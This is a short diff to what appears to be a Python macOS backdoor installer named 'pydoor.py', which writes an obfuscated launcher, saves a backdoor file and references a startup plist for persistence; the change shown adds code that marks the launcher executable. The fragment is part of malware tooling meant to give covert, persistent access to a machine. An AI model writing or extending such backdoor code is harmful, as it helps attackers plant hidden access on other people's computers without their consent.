@@ -2,6 +2,7 @@
 
 import sys
 import os
+import stat
 
 SCRIPT_NAME = "pydoor.py"
 PLIST_NAME  = "com.startup.plist"
@@ -18,6 +19,10 @@ def generate_launcher(path, path_to_backd):
     content = obfuscate_launcher(content)
     with open(path, 'w') as f:
         f.write(content)
+
+    st = os.stat(path)
+    os.chmod(path, st.st_mode | stat.S_IEXEC)
+
 
 def save_backdoor(path):
     content = open(backd_content_path, 'r').read()
